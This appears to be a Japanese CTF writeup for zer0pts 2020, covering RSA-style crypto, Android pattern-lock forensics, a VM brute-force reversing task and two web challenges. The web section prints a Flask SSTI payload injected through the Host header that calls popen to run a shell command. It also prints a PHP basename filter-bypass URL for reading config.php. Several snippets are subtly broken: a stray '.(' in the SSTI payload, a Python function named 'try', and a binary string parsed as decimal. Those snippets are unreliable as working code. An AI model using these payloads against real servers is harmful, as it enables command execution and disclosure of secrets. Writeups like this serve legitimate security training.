---
title: "zer0pts 2020 writeup"
date: 2020-03-10T15:47:42+09:00
---

ソロでチーム"helix"として参加した。1909 点を獲得し、順位は 43 位だった。

## crypto

### ROR

以下のソースコードとその実行結果が渡される。

```python
import random
from secret import flag

ror = lambda x, l, b: (x >> l) | ((x & ((1<<l)-1)) << (b-l))

N = 1
for base in [2, 3, 7]:
    N *= pow(base, random.randint(123, 456))
e = random.randint(271828, 314159)

m = int.from_bytes(flag, byteorder='big')
assert m.bit_length() < N.bit_length()

for i in range(m.bit_length()):
    print(pow(ror(m, i, m.bit_length()), e, N))
```

まず、最終行の`ror`が何をしているのか調べる。バイト列、数値、長さを渡しているように見えるので試しに適当な値を与えてみる。

```python
>>> ror = lambda x, l, b: (x >> l) | ((x & ((1<<l)-1)) << (b-l))
>>> b = 0b00100111
>>> for i in range(8):
...   print(format(ror(b, i, 8), '08b'))
...
00100111
10010011
11001001
11100100
01110010
00111001
10011100
01001110
```

この結果より第2引数で指定された数だけ右にローテーションしていることがわかる。

また、いろいろ試していると暗号化する前と後で奇数と偶数の変化が起こらないことに気づいた。
よってローテーションしながら暗号化していることを利用し、一つ一つ奇数か偶数かを集めていくとフラグを入手できる。

```python
from binascii import unhexlify

with open("log.txt", "r") as f:
  lines = f.readlines()

r = ""
for line in lines:
  if int(line) % 2 == 0:
    r += '0'
  else:
    r += '1'

print(unhexlify(format(int(r), 'x')))
```

## forensics

### Locked KitKat

Android のイメージファイルが渡されるので、パターンロックを解除してねという問題。
Google先生に聞き以下のツールを見つけた。

https://github.com/sch3m4/androidpatternlock

このツールに`/data/system/gesture.key`というファイルを食わせるとクラックしてくれるので、ターミナルにて実行。フラグが入手できた。


## others
コピペ問題

### Welcome
自明

### Survey
自明

## pwn

### hipwn

忘却。半分寝ている状態で解いていたのでメモが残っていなかった。

## reversing

### vmlog

Brainf*ck似のプログラムとその実行結果、及びプログラムを実行するためのPythonスクリプトが渡された。

試しに実行してみると文字入力を求められるので、実行結果はフラグを入力した際のものであると考えた。

同じ文字を同じ順番で入力すれば常に同じ出力が得られるので、総当りするスクリプトを実行するとフラグが入手できた。

```python
from pwn import *
context.log_level = 'error'

letters = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_+!?{}"


def try(candidate, log):
  p = process(("python", "./vm.py"))
  p.recvline() # M+s
  p.recvline() # [0,
  p.recvline() # [46
  p.sendline(candidate)
  for i in range(len(candidate)):
    line = p.recvline().decode()
    if line != log[i]:
      p.kill()
      return False
  p.kill()
  return True

def read_log():
  with open("log.txt", "r") as f:
    log = [i for i in f.readlines()]
  return log

def main():
  candidate = ""
  log = read_log()
  while True:
    for c in letters:
      if try(candidate + c, log):
        candidate += c
        print(f"[+] Found: {candidate}")
        break

main()
```

### QR Puzzle

鍵と暗号化されたQRコード、及び暗号化するプログラムが渡された。

プログラムの処理を読んでみると鍵ファイルの内容に従って特定のピクセルを入れ替えていた。

そこで、鍵ファイルの上下を逆にしそのまま鍵ファイルとしてプログラムに渡すと無事にQRコードが復号できた。


## web

### notepad

渡されたソースコードの以下の部分に脆弱性があった。

```python
@app.errorhandler(404)
def page_not_found(error):
    """ Automatically go back when page is not found """
    referrer = flask.request.headers.get("Referer")

    if referrer is None: referrer = '/'
    if not valid_url(referrer): referrer = '/'

    html = '<html><head><meta http-equiv="Refresh" content="3;URL={}"><title>404 Not Found</title></head><body>Page not found. Redirecting...</body></html>'.format(referrer)

    return flask.render_template_string(html), 404
```

404ページを返すときにリファラーの値を直接組み込んでいるので、ここでSSTIが行える。

しかしリファラーの値は以下の`valid_url`関数によってバリデーションが行われるため、ホスト部分を除き16文字を超えたものについては受け入れられない。

```python
def valid_url(url):
    """ Check if given url is valid """
    host = flask.request.host_url

    if not url.startswith(host): return False  # Not from my server
    if len(url) - len(host) > 16: return False # Referer may be also 404

    return True
```

この先の部分が想定解と異なっていた。

ホスト部分についてはヘッダと同値であるかのチェックしか行われないので、そこにSSTIを仕込めると考えた。

そこでヘッダを以下のように設定し、リクエストを送ったところフラグが入手できた。

```python
Host: {{"".__class__.__mro__[1].__subclasses__()[117].__init__.__globals__['popen'].('cat flag').read()}}
```


### Can you guess it?

渡されたソースコードの以下の部分に脆弱性があった。

```php
if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {
  exit("I don't know what you are thinking, but I won't let you read it :)");
}

if (isset($_GET['source'])) {
  highlight_file(basename($_SERVER['PHP_SELF']));
  exit();
}
```

`basename`関数はlocaleの設定を適切にしていなければマルチバイト文字に対して正常に動作しない。

つまり1行目の正規表現にマッチし、かつマルチバイト文字で終わる以下のようなURLでアクセスすればフラグを入手できた。

```
http://<CENSORED>/index.php/config.php/ほげ?source
```
